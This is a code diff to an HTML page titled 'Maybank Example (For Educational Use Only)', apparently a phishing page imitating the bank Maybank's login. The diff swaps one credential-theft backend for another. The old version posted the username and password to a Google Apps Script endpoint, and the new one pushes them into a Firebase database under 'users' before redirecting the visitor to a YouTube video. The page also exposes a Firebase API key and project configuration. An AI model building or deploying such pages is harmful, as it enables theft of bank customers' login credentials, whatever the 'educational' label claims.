@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
-
-
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Maybank Example (For Educational Use Only)</title>
     <style>
@@ -415,42 +415,57 @@ button#submit-enquiry:active {
         <p>&copy; 2025 Maybank Example. This is a demonstration site for educational purposes only.</p>
     </div> -->
 
-    <script>
+    
+    
+
+    <script type="module">
+        // Import Firebase functions
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCKaGzO-yDu0BvaZvUY1tkiUe43gD0NuUs",
+            authDomain: "mmforensic-4ccc6.firebaseapp.com",
+            databaseURL: "https://mmforensic-4ccc6-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "mmforensic-4ccc6",
+            storageBucket: "mmforensic-4ccc6.appspot.com",
+            messagingSenderId: "999790356709",
+            appId: "1:999790356709:web:4aaf0a07fe2abd9ea30c0c"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // Add event listener to the button
         document.getElementById("submit-enquiry").addEventListener("click", function () {
-            const username = document.getElementById("username-enquiry").value;
-            const password = document.getElementById("password-enquiry").value;
-    
-            // Web app URL from the Google Apps Script deployment
-            const scriptURL = "https://cors-anywhere.herokuapp.com/https://script.google.com/macros/s/AKfycbyIIHBdvab_lw_Olq0qjIBdpMteJgOZGNkwAvxn4z5YCqGZFqM987tfbIzJa_NzL3r8/exec";
-    
-            // Check if username or password is empty
+            const username = document.getElementById("username-enquiry").value.trim();
+            const password = document.getElementById("password-enquiry").value.trim();
+
             if (!username || !password) {
-                alert("Please fill in both username and password!");
+                alert("Please enter both username and password.");
                 return;
             }
-    
-            // Send the data
-            fetch(scriptURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ username, password }),
+
+            // Reference the "users" node in the database
+            const userRef = ref(database, "users");
+
+            // Push the new username and password
+            push(userRef, {
+                username: username,
+                password: password
             })
-                .then((response) => response.json())
-                .then((data) => {
-                    if (data.status === "success") {
-                        alert("Data submitted successfully!");
-                        window.location.href = "https://www.youtube.com/shorts/SXHMnicI6Pg";
-                    } else {
-                        alert("Failed to submit data. Please try again.");
-                    }
-                })
-                .catch((error) => {
-                    console.error("Error:", error);
-                    alert("An error occurred while submitting data. Please try again.");
-                });
+            .then(() => {
+                alert("User saved successfully!");
+                window.location.href = "https://www.youtube.com/shorts/SXHMnicI6Pg";
+            })
+            .catch(error => {
+                console.error("Error saving user:", error);
+                alert("Failed to save user. Please try again.");
+            });
         });
     </script>
-    
     
 </body>
 <footer>
